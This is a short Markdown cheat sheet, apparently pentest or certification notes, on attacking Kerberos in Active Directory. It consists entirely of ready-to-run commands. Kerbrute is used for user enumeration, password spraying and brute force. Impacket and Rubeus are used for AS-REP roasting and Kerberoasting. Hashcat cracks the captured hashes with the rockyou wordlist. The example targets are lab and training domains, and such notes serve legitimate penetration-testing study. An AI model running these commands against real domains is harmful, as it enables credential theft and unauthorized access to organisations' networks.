# Kerberos Enum

## Kerbrute (<a href="https://github.com/ropnop/kerbrute">link</a>)
```bash
# User enum
kerbrute_linux_amd64 userenum -d lab.ropnop.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password spray
kerbrute_linux_amd64 passwordspray --dc <dc ip> -d <domain> ./user.txt <password>

# Brute user
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman

# Combined brute force (brute user+pass combination)
cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
```

## AS-REP Roasting
```bash
# Impacket
sudo impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete (knowing the user)
sudo impacket-GetNPUsers -request -dc-ip 10.129.46.141 -request -outputfile hashes.aesreproast -usersfile username.txt htb.local/ (have bunch of users)
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Rubeus
.\Rubeus.exe asreproast /nowrap
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Kerberoasting
```bash
# Impacket
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete (knowing the user)
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 -usersfile username.txt corp.com/ (have bunch of users)
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
